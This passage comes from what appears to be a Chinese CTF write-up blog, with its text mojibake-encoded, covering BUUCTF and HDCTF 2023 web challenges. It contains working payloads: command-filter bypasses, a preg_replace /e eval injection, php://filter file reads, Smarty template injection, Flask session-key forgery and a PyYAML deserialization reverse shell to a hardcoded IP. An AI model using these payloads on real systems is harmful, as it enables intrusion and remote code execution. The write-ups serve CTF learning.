(preg_match('/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i', $cmd)){\n    echo \"yes\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856165041-ec8b1553-a9ed-4c29-8092-e50c61727e41.png)\n\næ¥ç€æ¥çœ‹ç¬¬äºŒéƒ¨åˆ†md5å¼ºç›¸ç­‰\n\nä¸€å¼€å§‹æˆ‘æ˜¯æƒ³é€šè¿‡æ•°ç»„æ–¹å¼ç»•è¿‡ ä½†æ˜¯è¿™é“é¢˜åœ¨post aå’Œbå€¼åå¯¹ä»–ä»¬è¿›è¡Œäº†å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ å› æ­¤ä¸èƒ½ç”¨æ•°ç»„ç»•è¿‡äº†\n\nåªèƒ½ç”¨ä¸€ä¸ªè„šæœ¬è¿›è¡Œmd5ç¢°æ’ ä½¿å¾—ä¸¤ä¸ªå­—ç¬¦çš„md5å€¼å¼ºç›¸ç­‰\n\nåªèƒ½å€ŸåŠ©fastcollè¿™ä¸ªå·¥å…· å…·ä½“å‚è€ƒï¼š[https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167785642816800213071097%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187](https://blog.csdn.net/shuaicenglou3032/article/details/118197904?ops_request_misc=%7B%22request%5Fid%22%3A%22167785642816800213071097%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=167785642816800213071097&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118197904-null-null.142^v73^insert_down3,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=fastcoll&spm=1018.2226.3001.4187) è¿™ç¯‡æ–‡ç« \n\næ³¨æ„æœ€åç”Ÿæˆçš„ç»“æœæ˜¯é€šè¿‡urlç¼–ç åçš„ å¦‚æœä¸è¿›è¡Œurlç¼–ç  é‚£ä¹ˆç»“æœä¼šå‡ºç°ä¹±ç  æœ¬åœ°æµ‹è¯•ï¼š\n\n```php\n<?php\n$a = \"fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0\";\n$b = \"fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0\";\necho urldecode($a);\necho \"\\n\";\necho urldecode($b);\necho \"\\n\";\necho \"--------------------------------------------------\";\necho \"\\n\";\nif(md5(urldecode($a))===md5(urldecode($b))){\n    echo \"yes\";\n}\nelse{\n    echo \"no\";\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677856630211-e345d088-4b18-477d-b771-d38e62a64410.png)\n\nå› ä¸ºæˆ‘ä»¬æäº¤çš„å†…å®¹ä¼šè¢«æµè§ˆå™¨é»˜è®¤urlè§£ç ä¸€æ¬¡ æ‰€ä»¥ç»“æœéƒ½æ˜¯ä¸€æ ·çš„\n\nä½†æ˜¯æˆ‘ä»¬æŸ¥è¯»æ–‡ä»¶æ‰€éœ€çš„ `ls cat`éƒ½è¢«æ­£åˆ™åŒ¹é…äº†è¿™é‡Œåº”è¯¥æ€ä¹ˆç»•è¿‡å‘¢\n\nç¬¬ä¸€ç§æ–¹å¼ï¼š\n\nå¯ä»¥ç”¨`dir`æ¥ä»£æ›¿`ls` è¿›è¡Œæµè§ˆæ–‡ä»¶\n\nä½œç”¨å’Œ`ls`ä¸€æ ·\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857170069-3d416306-3483-485a-8c98-90b3fa7d5970.png)\n\n`sort`ä»£æ›¿`cat`è¿›è¡Œè¯»æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857270604-b9b7b79c-de53-4bd1-a023-fcc8b44a3134.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857752295-1bffe6b1-fa37-47d1-86ec-954c63aef05f.png)\n\næ³¨æ„è¿™é‡ŒæŠ“åŒ…payloadçš„æ—¶å€™è¦å°†æäº¤æ–¹å¼æ”¹ä¸ºpost ç¬¬ä¸€æ¬¡åšä¸€ç›´éƒ½æ˜¯getä¼ å‚ä¸€ç›´æ²¡åšå‡ºæ¥ ä¹‹åæ‰å‘ç°è¦å°†bpçš„ä¼ å‚æ–¹å¼æ”¹ä¸ºpost ç©ºæ ¼ç”¨urlç¼–ç æ–¹å¼`%20`ç»†èŠ‚å¾ˆé‡è¦\n\næ„é€ payloadï¼š`?cmd=dir%20/`\n\npost:`a=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-%E8%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87K%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3Fl%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%87P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1Al%EDP%2C%D5%18Q9%EB%B6%89ZW%F4%E5iOa%B0&b=fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00NkutV%9B%EE%A4%86%BA%840%5B%E0%14%F4%5B%22-h%07l%DA%A1%26%06%3BqK%10%92%2B%08%FE%C9%C4H%94%3F%F2k%CE%C0%1A%87%CB%DE_%8A7%EA%94%C7%3B%B4%2A%83%D0%3F%EC%B3%25%F6%E5%F6%B2%11%E0%21%CFA%8EM%7E%CB%C5%2C%17%E6%0A%B97%09%07P%5B%121%09%B3%00%C0%2B%60h%B8%D3%DD+D%9F%C3%A24tBFS%1A%EC%ECP%2C%D5%18Q9%EB%B6%89ZW%F4eiOa%B0`![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857467024-2f3e1f70-d3ea-4a45-be27-295350e349e9.png)\n\næ„é€ payloadï¼š`?cmd=sort%20/flag`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857524959-3e9deaf5-07fe-4452-bb95-4a93d916f4fd.png)\n\nç¬¬äºŒç§æ–¹å¼ ä¹‹å‰è¯´æ­£åˆ™åŒ¹é…æ²¡æœ‰è¿‡æ»¤åæ–œæ \n\nåæ–œæ åœ¨linuxå‘½ä»¤ä¸­ä¹Ÿæ˜¯èµ·ç€è½¬ä¹‰çš„æ„ä¹‰ é‚£ä¹ˆåœ¨å­—æ¯å‰åŠ `\\`å°±ç­‰äºæ²¡åŠ  `\\n`è¿™ç§ç‰¹æ®Šæƒ…å†µé™¤å¤–\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857770921-1b917b10-6346-4376-85f9-ee34ce0e440f.png)\n\né‚£ä¹ˆå°±å¯ä»¥åœ¨å‘½ä»¤ä¸­æ·»åŠ åæ–œæ è¿›è¡Œç»•è¿‡æ­£åˆ™åŒ¹é…\n\næ„é€ payload:`?cmd=l\\s%20/`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857842519-a139ce6f-740f-4d26-9491-5b54072c5a5c.png)\n\nå†æ„é€ ï¼š`?cmd=ca\\t%20/flag`\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677857890453-7b478239-0e35-4be4-849a-e51c406b7fc6.png)\n","tags":["bypass","md5å¼ºç›¸ç­‰ç¢°æ’"],"categories":["buuctf"]},{"title":"buuctf-40-[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤","url":"/post/ed5a1437.html","content":"\n[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤\n\n<!--more-->\n\nå…ˆæ˜¯ä¸€ä¸ªä»£ç å®¡è®¡å’Œä¹‹å‰ä¸€ä¸ªååºåˆ—åŒ–é¢˜ç›®å¾ˆåƒï¼Œå°±æ˜¯ä¸€ä¸ªä¼ªåè®®çš„åˆ©ç”¨ \n\næ„é€ payloadï¼š\n\n```\n?text=data:text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php\n```\n\nå¾—åˆ°æºç ï¼š\n\n```php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\n\nfunction getFlag(){\n    @eval($_GET['cmd']);\n}\n```\n\nç„¶åè¿™é‡Œæ¶‰åŠåˆ°preg_replace() /eæ¨¡å¼çš„æ¼æ´ å°†ç”¨äºæ›¿æ¢çš„éƒ¨åˆ†å½“ä½œphpä»£ç æ‰§è¡Œ å‚è€ƒï¼šhttps://xz.aliyun.com/t/2557\n\nè¿™é‡Œ`\\\\1` å…¶å®å°±æ˜¯ `\\1` ç¬¬ä¸€ä¸ª `\\ `ç”¨äºè½¬ä¹‰äº† é‚£ä¹ˆç»“æœå°±æ˜¯`\\1` åœ¨è¿™é‡Œæ˜¯åå‘å¼•ç”¨ ç”±äºæˆ‘è¿™é‡Œæ²¡æå¤ªæ˜ç™½ \n\nè¿™ç±»é¢˜ç›´æ¥ç”¨æ¨¡æ¿ç­”æ¡ˆå°±è¡Œ`\\S*=${å‘½ä»¤æ‰§è¡Œ}` å¤§ä½¬æ€»ç»“çš„å¾ˆå…¨ \n\næ€è·¯å°±æ˜¯è°ƒç”¨getFlag()å‡½æ•° ç„¶åcmd= å‘½ä»¤æ‰§è¡Œ\n\n`/next.php?\\S*=${getFlag()}&cmd=system('cat /flag');` æ³¨æ„æ˜¯åœ¨next.php ä¸‹æäº¤getä¼ å‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250464663-0534828a-c656-49be-a906-3aaaf89394b0.png)\n\nè¿™é‡Œforeachæ­é…`$_GET`æœ‰ç‰¹æ®Šçš„ç”¨æ³• æ³¨æ„è¿™é‡Œä¸æ˜¯`$_GET[]`\n\næœ¬åœ°æ­äº†ä¸€ä¸ªç¯å¢ƒæµ‹è¯•äº†ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677250349098-0aa84b36-823c-4a2d-91d8-c76fcbe35c26.png)\n\nç®€å•è¯´å°±æ˜¯å½¢å¦‚a=bçš„å½¢å¼å˜é‡åå’Œå€¼åˆ†æˆä¸¤ä¸ªå˜é‡æ¥ä½¿ç”¨ è›®ç¥å¥‡çš„\n","tags":["preg_replace() /e"],"categories":["buuctf"]},{"title":"buuctf 39-[BSidesCF 2020]Had a bad day","url":"/post/78a48903.html","content":"\n[BSidesCF 2020]Had a bad day\n\n<!--more-->\n\næ‰“å¼€æŠ“åŒ…æ²¡æœ‰å‘ç°ä»€ä¹ˆå¼‚å¸¸çš„ä¸œè¥¿ï¼Œä½†æ˜¯ç½‘ç«™è·å–æ–°é¡µé¢æ–¹å¼æœ‰ç‚¹å¥‡æ€ªï¼Œé€šè¿‡getä¼ å‚å–å€¼æ¥è·å–æ–°å†…å®¹ï¼Œå°±è”æƒ³åˆ°äº†ä¼ªåè®®ã€‚\n\nç›´æ¥è¯•è¯•flag.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214256490-6f408795-207e-463c-bc26-534bf543cfd9.png)\n\nä¸è¡Œå‘¢å°±è¯•è¯•index.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677214298541-98bada9c-dcc0-487c-ba35-bdcb23d1b86e.png)\n\nå‘ç°åå°ä¸»åŠ¨ç»™æˆ‘ä»¬åŠ äº†.phpåç¼€ \n\næ„é€ payloadï¼š`?category=php://filter/read=convert.base64-encode/resource=index`\n\nè·å¾—base64ç è§£ç å¾—å‡ºæºç ï¼š\n\n```plain\n                  <?php\n    \t\t\t\t$file = $_GET['category'];\n    \n    \t\t\t\tif(isset($file))\n    \t\t\t\t{\n    \t\t\t\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\")){\n    \t\t\t\t\t\tinclude ($file . '.php');\n    \t\t\t\t\t}\n    \t\t\t\t\telse{\n    \t\t\t\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n    \t\t\t\t\t}\n    \t\t\t\t}\n    \t\t\t\t?>\n```\n\næˆ‘ä»¬åªèƒ½è¯»å–ä»–è§„å®šçš„`woofers` `meowers` `index` ä¸‰ä¸ªæ–‡ä»¶\n\nçœ‹äº†åˆ«äººçš„wp åˆå­¦åˆ°äº†æ–°å§¿åŠ¿ ä¼ªåè®®é‡Œé¢è¿˜å¯ä»¥å†åµŒå¥—ä¸€å±‚åè®® åŠ ä¸Šä»–ç»™çš„åˆæ³•æ–‡ä»¶\n\n```\n?category=php://filter/read=convert.base64-encode/index/resource=flag\n```\n\n`?category=php://filter/read=convert.base64-encode/resource=index/../flag` ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥ å­¦åˆ°äº†\n","tags":["phpä¼ªåè®®"],"categories":["buuctf"]},{"title":"HDCTF 2023(çœå†…èµ›é“)","url":"/post/dd40690e.html","content":"\nHDCTF 2023(çœå†…èµ›é“) éƒ¨åˆ†WP\n\n<!--more-->\n\næœ€ç»ˆæ’åç¬¬ä¸ƒå§ webç‹—è¡¨ç¤ºwebåé¢å‡ é“çœŸçš„å¾ˆéš¾,ç›®å‰åˆ·é¢˜è¿˜æ²¡æœ‰åšåˆ°åå‡ é“é¢˜ç›®çš„ç±»å‹ï¼Œæ‰€ä»¥ååŠé˜¶æ®µçœŸçš„åœ¨åç‰¢ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼ŒåŠªåŠ›ï¼ï¼ï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165596340-28745076-d8ed-4e46-9793-4e5d6fe9aa23.png)\n\n# Web\n\n## Welcome To HDCTF 2023\n\n### è§£ä¸€ï¼š\n\nç›´æ¥é€æ­»\n\n### è§£äºŒï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165396401-dde8abd9-573b-46cd-ad8d-226bd51cf855.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165410073-d283c8aa-3c61-4053-b5df-999deea9f425.png)\n\nç›´æ¥è¾“å…¥åœ¨consoleä¸­è¾“å…¥seeeeeeeecretå°±èƒ½æ‹¿åˆ°\n\n## SearchMaster\n\nè¿™é¢˜æ‹¿äº†ä¸€è¡€ å¼€å¿ƒqwq\n\nä¸€çœ¼ä¸çœŸ phpçš„smartyæ³¨å…¥\n\næ„é€ payloadï¼š\n\n```\ndata={if system('ls /')}{/if}\ndata={if system('cat /flag_13_searchmaster')}{/if}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165707395-5aedfc9c-7b33-4f5f-8cef-67275fe4f7ab.png)\n\n# Crypto\n\n## Normal_Rsa\n\nåº”è¯¥æ˜¯é¢˜ç›®å‡ºé—®é¢˜äº† æ‰“å¼€é¢˜ç›®flagå°±æœ‰\n\n# Misc\n\n## hardMisc\n\nä¹Ÿæ˜¯æ‹¿åˆ°ä¸€ä¸ªä¸€è¡€\n\næ‹–è¿›010ä¸€æŠŠæ¢­\n\næœ«å°¾ base64è§£ç æ‹¿åˆ°flag\n\n\n\n# å¤ç°ï¼š\n\n## YamiYami\n\nä¸€é“å…³äºsessionä¼ªé€  yaml(ä¸€å¼€å§‹ä¸€ç›´åœ¨æœyamiååºåˆ—åŒ– è¿˜åœ¨æƒ³ä¸ºä»€ä¹ˆæœä¸åˆ°ç›¸å…³æ–‡ç«  çœŸè¯¥æ­»å•Šæˆ‘)ååºåˆ—åŒ– shellåå¼¹çš„é¢˜ç›®\n\nå€ŸåŠ©è¿™é“é¢˜ç›®å¥½å¥½å­¦ä¹ ä¸€ä¸‹yamiæ¼æ´å’Œshellåå¼¹\n\nè¿›å…¥é¢˜ç›®åèƒ½çœ‹åˆ°æœ‰ä¸‰ä¸ªè·¯ç”± `/read`æ˜¯ç”¨æ¥è¯»æ–‡ä»¶çš„ `/upload`æ˜¯ç”¨æ¥ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„ä»£ç æ–‡ä»¶çš„ `/pwd `å­—é¢æ„æ€å°±æ˜¯å‘Šè¯‰æˆ‘ä»¬å½“å‰åœ¨å“ªä¸ªæ–‡æ¡£ä¸­\n\nå½“æ—¶åšé¢˜çš„æ—¶å€™è¿˜ä»¥ä¸ºè¿™é“é¢˜ç›®éš¾åº¦åº”è¯¥ä¸ä¼šå¾ˆéš¾ è¿˜ä»¥ä¸ºæ˜¯å¾ˆåŸºç¡€çš„ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬å»åŒ…å«ç„¶ågetshell çœ‹äº†wpçœŸçš„æ€€ç–‘äººç”Ÿ\n\n### éé¢„æœŸ\n\nå…ˆè¯´è¯´éé¢„æœŸå§ ç›´æ¥è¯»å–ç¯å¢ƒå˜é‡å°±å¯ä»¥äº† æˆ‘å½“æ—¶ä¹Ÿæ˜¯è¿™ä¹ˆæƒ³çš„ ä½†æ˜¯æˆ‘çº¯è„‘ç˜«å»è¯»linuxç³»ç»Ÿç”¨æˆ·ç¯å¢ƒä¿¡æ¯äº†\n\nè€Œä¸”é¢˜ç›®ç¯å¢ƒåº”è¯¥æ˜¯åœ¨dockerä¸‹\n\nä¸€å¼€å§‹ä¸€ç›´åœ¨è¯»`/etc/profile`\n\n **/etc/profileï¼š** æ­¤æ–‡ä»¶ä¸ºç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·è®¾ç½®ç¯å¢ƒä¿¡æ¯,å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•æ—¶,è¯¥æ–‡ä»¶è¢«æ‰§è¡Œ. å¹¶ä»/etc/profile.dç›®å½•çš„é…ç½®æ–‡ä»¶ä¸­æœé›†shellçš„è®¾ç½®ã€‚  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514003165-ae5d5af3-b1fe-4857-b9c3-8749c4bd9f08.png)\n\næ ¹æœ¬æ²¡ä»€ä¹ˆç”¨\n\nåº”è¯¥è¯»ç¯å¢ƒå˜é‡`/proc/1/environ`ï¼ˆè¯¦ç»†å¯å‚è€ƒï¼šhttps://blog.csdn.net/FY_2018/article/details/112986445ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514196676-0a40092c-feba-4e9c-b7db-48181e2efc24.png)\n\n### é¢„æœŸï¼š\n\nä¸Šä¼ ä¸€ä¸ªyamiååºåˆ—åŒ–æ–‡ä»¶ ç„¶ååå¼¹shellå»æ‰“\n\né¦–å…ˆå…ˆå»è¯»æºæ–‡ä»¶ å‘ç°åšflaskçš„é¢˜ç›® èƒ½getåˆ°æºä»£ç å°±å»åŠªåŠ›ï¼\n\nè¿™é‡Œç”¨åˆ°äº†python3è§£æç‰¹æ€§\n\nå¦‚æœç›´æ¥æ„é€ payload`/read?url=file:///app.py` flagå­—æ ·ä¹Ÿè¢«æ­£åˆ™äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514715380-37099247-9a07-43a4-9cd2-067bfface208.png)\n\n\n\nå‘ç°æ˜¯ä¸è¡Œçš„ è¢«è¿‡æ»¤äº†\n\nè¿™é‡Œç”¨åˆ°äº†python3çš„å­—ç¬¦è§£æç‰¹æ€§é€šè¿‡åŒé‡urlç¼–ç ï¼ˆå…¨å­—ç¬¦ï¼‰å»ç»•è¿‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514739750-28c9e6f1-ebd3-4d0e-9735-7a158d95388d.png)\n\næ‹¿åˆ°æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514766571-03f89872-a08b-47e5-b1e7-b90e9d3eeb92.png)\n\n\n\næºç ï¼š\n\n```cmake\n#encoding:utf-8\nimport os\nimport re, random, uuid\nfrom flask import *\nfrom werkzeug.utils import *\nimport yaml\nfrom urllib.request import urlopen\napp = Flask(__name__)\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\napp.debug = False\nBLACK_LIST=[\"yaml\",\"YAML\",\"YML\",\"yml\",\"yamiyami\"]\napp.config['UPLOAD_FOLDER']=\"/app/uploads\"\n\n@app.route('/')\ndef index():\n    session['passport'] = 'YamiYami'\n    return '''\n    Welcome to HDCTF2023 <a href=\"/read?url=https://baidu.com\">Read somethings</a>\n    <br>\n    Here is the challenge <a href=\"/upload\">Upload file</a>\n    <br>\n    Enjoy it <a href=\"/pwd\">pwd</a>\n    '''\n@app.route('/pwd')\ndef pwd():\n    return str(pwdpath)\n@app.route('/read')\ndef read():\n    try:\n        url = request.args.get('url')\n        m = re.findall('app.*', url, re.IGNORECASE)\n        n = re.findall('flag', url, re.IGNORECASE)\n        if m:\n            return \"re.findall('app.*', url, re.IGNORECASE)\"\n        if n:\n            return \"re.findall('flag', url, re.IGNORECASE)\"\n        res = urlopen(url)\n        return res.read()\n    except Exception as ex:\n        print(str(ex))\n    return 'no response'\n\ndef allowed_file(filename):\n   for blackstr in BLACK_LIST:\n       if blackstr in filename:\n           return False\n   return True\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        if 'file' not in request.files:\n            flash('No file part')\n            return redirect(request.url)\n        file = request.files['file']\n        if file.filename == '':\n            return \"Empty file\"\n        if file and allowed_file(file.filename):\n            filename = secure_filename(file.filename)\n            if not os.path.exists('./uploads/'):\n                os.makedirs('./uploads/')\n            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n            return \"upload successfully!\"\n    return render_template(\"index.html\")\n@app.route('/boogipop')\ndef load():\n    if session.get(\"passport\")==\"Welcome To HDCTF2023\":\n        LoadedFile=request.args.get(\"file\")\n        if not os.path.exists(LoadedFile):\n            return \"file not exists\"\n        with open(LoadedFile) as f:\n            yaml.full_load(f)\n            f.close()\n        return \"van you see\"\n    else:\n        return \"No Auth bro\"\nif __name__=='__main__':\n    pwdpath = os.popen(\"pwd\").read()\n    app.run(\n        debug=False,\n        host=\"0.0.0.0\"\n    )\n    print(app.config['SECRET_KEY'])\n```\n\nå‘ç°è¿˜æœ‰ä¸€ä¸ª`/boogipop`è·¯ç”±\n\n```cmake\n@app.route('/boogipop')\ndef load():\n    if session.get(\"passport\")==\"Welcome To HDCTF2023\":\n        LoadedFile=request.args.get(\"file\")\n        if not os.path.exists(LoadedFile):\n            return \"file not exists\"\n        with open(LoadedFile) as f:\n            yaml.full_load(f)\n            f.close()\n        return \"van you see\"\n    else:\n        return \"No Auth bro\"\n```\n\nå½“`session=\"Welcome To HDCTF2023\"`é€šè¿‡getæ–¹å¼å»è¯»æ–‡ä»¶ ä¹Ÿå°±æ˜¯è¯´è¿˜éœ€è¦sessionä¼ªé€  \n\nä¼ªé€ éœ€è¦key é‚£ä¹ˆçœ‹æºç æ˜¯æ€ä¹ˆç”Ÿæˆçš„\n\n```cmake\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\n```\n\nåœ¨ python ä¸­ä½¿ç”¨ uuid æ¨¡å—ç”Ÿæˆ UUIDï¼ˆé€šç”¨å”¯ä¸€è¯†åˆ«ç ï¼‰ã€‚å¯ä»¥ä½¿ç”¨ uuid.getnode() æ–¹æ³•æ¥è·å–è®¡ç®—æœºçš„ç¡¬ä»¶åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°†ä½œä¸º UUID çš„ä¸€éƒ¨åˆ†ã€‚  \n\n`/sys/class/net/eth0/address`ï¼Œè¿™ä¸ªå°±æ˜¯ç½‘å¡çš„ä½ç½®ï¼Œè¯»å–ä»–è¿›è¡Œä¼ªé€   \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682516256550-09f531fb-105e-458e-b1d5-62edbda38d4b.png)\n\n```cmake\nimport random\nrandom.seed(0x0242ac024ed7) #å»æ‰ï¼šåŠ ä¸Š0xä¹Ÿå°±æ˜¯åå…­è¿›åˆ¶\nprint(str(random.random()*233))\n```\n\nå¾—åˆ°keyä¸º`33.893457812509084`\n\né€šè¿‡è„šæœ¬ä¼ªé€ session\n\nç„¶å`yaml.full_load(f)`å°±æ˜¯æ¼æ´æ‰€åœ¨ç‚¹ä»–ä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶å†…å®¹ååºåˆ—åŒ– å¹¶ä¸”ä»£ç ä¸­å¹¶æ²¡æœ‰å›æ˜¾çš„è¯­å¥ä¹Ÿæš—ç¤ºäº†è¿™é‡Œè¦é€šè¿‡åå¼¹shellçš„æ–¹å¼å»æ‰“ï¼ˆè¿™é‡Œå‚è€ƒè¿™ç¯‡å¤§ä½¬çš„æ–‡ç« å¤ªç»†äº† https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/ï¼‰\n\nä¸Šä¼ ååºåˆ—åŒ–æ–‡ä»¶\n\n```cmake\n!!python/object/new:str\n    args: []\n    # é€šè¿‡ state è§¦å‘è°ƒç”¨\n    state: !!python/tuple\n      - \"__import__('os').system('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 <&1\\\"')\"#è¿™é‡Œå°±æ˜¯ä»£ç æ‰§è¡Œ é€šè¿‡bashç›´æ¥åå¼¹shell \n      # ä¸‹é¢æ„é€  exp\n      - !!python/object/new:staticmethod\n        args: []\n        state: \n          update: !!python/name:eval\n          items: !!python/name:list  # ä¸è®¾ç½®è¿™ä¸ªä¹Ÿå¯ä»¥ï¼Œä¼šæŠ¥é”™ä½†ä¹Ÿå·²ç»æ‰§è¡ŒæˆåŠŸ\n```\n\nè‡³äºä¸ºä»€ä¹ˆä¸Šé¢å¤§ä½¬çš„æ–‡ç« è®²çš„å¾ˆä»”ç»† æˆ‘å°±ä¸çŒ®ä¸‘äº† è‡ªå·±å¤ªèœäº†\n\nç®€å•ç†è§£å°±æ˜¯pythonå°†å‘½ä»¤æ‰§è¡Œçš„ä»£ç å¡å…¥äº†å¯¹è±¡ä¸­ç„¶åyamlåºåˆ—åŒ–å¾—åˆ°è¿™ä¸ª ç„¶åå†åˆ©ç”¨ååºåˆ—åŒ–å»å‘½ä»¤æ‰§è¡Œ çœ‹èµ·æ¥æ¯”è¾ƒå¥‡æ€ªæ˜¯å› ä¸ºè¿™ç§æ ¼å¼æ˜¯å±äºyamlå½¢å¼çš„åºåˆ—åŒ–å¯¹è±¡ æ‰€ä»¥çœ‹èµ·æ¥æ¯”è¾ƒçš„é™Œç”Ÿ è¿˜æœ‰å°±æ˜¯è¿™é‡Œçš„å‘½ä»¤æ‰§è¡Œæ˜¯ç”¨åå¼¹shell æ˜¯å› ä¸ºé€šè¿‡çœ‹æºç å‘ç°æ²¡æœ‰å›æ˜¾çš„ä»£ç  